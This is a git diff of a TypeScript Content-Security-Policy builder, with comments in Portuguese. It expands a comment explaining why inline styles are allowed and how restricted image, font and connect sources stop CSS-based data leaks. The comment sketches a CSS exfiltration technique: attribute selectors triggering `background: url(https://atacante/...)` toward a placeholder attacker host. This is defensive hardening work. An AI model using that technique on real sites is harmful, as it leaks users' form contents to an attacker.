@@ -67,9 +67,26 @@ export function montarCsp(nonce: string): string {
     "frame-ancestors 'none'",
     "form-action 'self'",
     `script-src 'self' 'nonce-${nonce}'`,
-    // Sem 'unsafe-inline' em estilo os gráficos e qualquer `style=` do React
-    // somem. Diferente de script, atributo de estilo não executa código: o pior
-    // caso é aparência, não execução.
+    // -----------------------------------------------------------------------
+    // 'unsafe-inline' em ESTILO — aceito, e o que o torna aceitável
+    // -----------------------------------------------------------------------
+    // Sem ele os gráficos e qualquer `style=` do React somem. Atributo de
+    // estilo não executa código, então o pior caso não é execução.
+    //
+    // Mas não é só "aparência", e a versão anterior deste comentário parava
+    // cedo demais: CSS injetado EXFILTRA dado sem executar nada — um seletor de
+    // atributo que casa com o valor de um campo e dispara `background:
+    // url(https://atacante/...)` vaza o conteúdo caractere a caractere.
+    //
+    // O que fecha esse vetor aqui não é o `style-src`: são os DESTINOS. Com
+    // `img-src`, `font-src` e `connect-src` restritos a 'self' e aos dois
+    // domínios conhecidos, o CSS injetado não tem para onde mandar o que leu.
+    //
+    // Ou seja: a segurança desta linha depende das linhas abaixo. Se alguém um
+    // dia abrir `img-src *` "só para carregar uma imagem externa", este
+    // 'unsafe-inline' deixa de ser inofensivo no mesmo commit — e é isso que o
+    // teste `csp.test.ts` amarra, conferindo a COMBINAÇÃO e não cada diretiva
+    // isolada. Apontado pelo ZAP em 08/09/2026 (regra 10055-6).
     "style-src 'self' 'unsafe-inline'",
     `img-src ${imagens.join(" ")}`,
     "font-src 'self'",
